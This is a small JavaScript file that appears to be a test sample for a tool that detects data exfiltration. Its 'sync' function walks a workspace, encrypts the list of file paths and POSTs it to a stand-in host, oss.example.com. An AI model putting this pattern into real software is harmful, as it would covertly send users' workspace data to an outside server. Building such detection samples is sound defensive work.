'use strict';
// E0 基线：标准实现 + 标准 API 名。
// 期望：工具应能确认「信封加密」并组合出外传链路。
const crypto = require('crypto');
const fs = require('fs');

function collectWorkspace(root) {
  const files = [];
  (function walk(dir) {
    for (const e of fs.readdirSync(dir, { withFileTypes: true })) {
      const p = dir + '/' + e.name;
      if (e.isDirectory()) walk(p); else files.push(p);
    }
  })(root);
  return files;
}

function encryptArtifact(buf) {
  const key = crypto.randomBytes(32);
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
  return Buffer.concat([iv, cipher.update(buf), cipher.final()]);
}

async function uploadObject(target, body) {
  return fetch(target.url, { method: 'POST', headers: target.headers, body });
}

async function sync(root) {
  const files = collectWorkspace(root);
  const encrypted = encryptArtifact(Buffer.from(files.join('\n')));
  return uploadObject({ url: 'https://oss.example.com/bucket', headers: {} }, encrypted);
}

module.exports = { sync };
